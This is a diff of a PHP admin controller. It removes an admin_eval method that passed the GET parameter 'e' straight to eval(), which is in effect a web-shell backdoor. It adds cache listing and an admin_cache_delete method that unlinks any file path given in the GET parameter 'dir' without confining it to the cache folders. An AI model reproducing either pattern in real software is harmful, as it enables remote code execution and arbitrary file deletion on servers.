@@ -3,7 +3,6 @@ class AdminAction extends Action{
 	private $logined=NULL;
 	private $Model;
 	public function _initialize(){
-		session_start();
 		$this->Model= new Model();
 	}
 	public function index(){
@@ -197,11 +196,33 @@ class AdminAction extends Action{
 			return;
 		}
 	}
-	public function admin_eval(){
+	public function admin_cache(){
 		$this->is_logined() or $this->notLogined();
-		$model=D('Article');
-		if (isset($_GET['e'])){
-			eval($_GET['e']);
+		load('@.fw');
+		$dirList=array(
+				'Html'=>HTML_PATH,
+				'Runtime'=>APP_PATH.'Runtime/',
+			);
+		foreach ($dirList as $name=>$path){
+			$list[$name]=dir_list($path);
+		}
+		$this->dirList=$list;
+		$this->display();
+	}
+	public function admin_cache_delete(){
+		$this->is_logined() or $this->notLogined();
+		if (isset($_GET['dir'])){
+			if( is_file ($_GET['dir'])){
+				if (unlink($_GET['dir'])){
+					$this->success('删除成功');
+				}
+				else{
+					$this->error('删除失败');
+				}
+			}
+			else{
+				$this->error('删除失败');
+			}
 		}
 	}
 }
